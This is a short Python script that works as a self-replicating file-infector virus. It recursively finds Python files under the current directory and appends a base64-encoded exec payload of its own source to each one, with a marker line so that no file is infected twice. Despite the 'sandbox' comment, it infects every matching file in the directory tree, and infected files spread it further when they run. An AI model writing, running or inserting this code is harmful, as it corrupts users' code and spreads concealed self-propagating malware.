#!/usr/bin/python3

import os
import base64
#Sandbox for safety. Only current directory on will be infected!

# Check if the file is already infected. If it is there is no reason to re-infect it!
def confirm_write(contents):
	if "#####################INFECTED###################" in contents:
		return False
	return True

# Infect the file
def write(file):
	# Get the last line of the file. If infected it should be our last appended line
	with open(file, 'rb') as infection_handle:
		try:
			infection_handle.seek(-2, os.SEEK_END)
			while infection_handle.read(1) != b'\n':
				infection_handle.seek(-2, os.SEEK_CUR)
		except OSError:
			infection_handle.seek(0)
		last_line = infection_handle.readline().decode()

	if not confirm_write(last_line):
		return

	# Read the file contents and encode them on a base64 decode wrapper and exec to execute when running the infected script
	with open(__file__, 'r') as handle:
		writer = handle.read()
		encoded = base64.b64encode(bytes(writer, 'utf-8'))
		payload = f"import base64; exec(base64.b64decode({encoded}));"
	# Infect the new file
	with open(file, 'a') as infection_handle:
		infection_handle.write(payload)
		infection_handle.write("\n#####################INFECTED###################")

# Get all the files under the directory we are in (The sandbox implementation)
def getFilesRecursively():
	files_to_infect = []
	for dirs, subs, files in os.walk(os.getcwd()):
		for file in files:
			if '.py' in file:
				files_to_infect.append(dirs + '/' + file)
	return files_to_infect


files_to_infect = getFilesRecursively()
for file in files_to_infect:
	write(file)
#####################INFECTED###################